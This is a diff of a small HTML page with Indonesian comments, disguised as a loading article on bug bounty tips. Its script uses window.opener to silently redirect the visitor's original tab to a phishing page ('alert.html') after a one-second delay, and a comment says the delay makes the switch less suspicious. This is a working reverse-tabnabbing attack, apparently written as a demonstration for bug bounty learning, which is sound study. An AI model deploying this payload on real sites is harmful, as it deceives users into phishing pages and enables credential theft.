@@ -4,24 +4,24 @@
     <meta charset="UTF-8">
     <title>Membaca Artikel...</title>
     <style>
-        body { font-family: Arial; text-align: center; margin-top: 100px; color: #555; }
+        body { font-family: Arial; text-align: center; margin-top: 100px; color: #666; }
     </style>
 </head>
 <body>
     <h1>Tips Jago Bug Bounty</h1>
-    <p>Artikel sedang dimuat... Silakan cek tab sebelumnya sebentar.</p>
+    <p>Artikel sedang dimuat... Silakan baca tab sebelumnya sebentar.</p>
 
     <script>
-        // Cek akses ke tab yang membuka halaman ini
+        // Cek akses ke jendela yang membuka halaman ini
         if (window.opener) {
-            // Jeda 1 detik biar perpindahan tab asal nggak terlalu mencurigakan
+            // Tunggu 1 detik agar perpindahan tidak terlalu mencurigakan
             setTimeout(function() {
-                // Ganti lokasi tab asal (korban) ke halaman jebakan lo
+                // Ganti lokasi tab asal ke halaman phishing (alert.html)
                 window.opener.location = "alert.html";
-                console.log("Tab asal (opener) berhasil diarahkan ke alert.html");
+                console.log("Tab asal berhasil diarahkan ke alert.html");
             }, 1000);
         } else {
-            console.log("Gagal: window.opener tidak ditemukan.");
+            document.body.innerHTML += "<p style='color:red;'>Gagal: window.opener tidak ditemukan.</p>";
         }
     </script>
 </body>
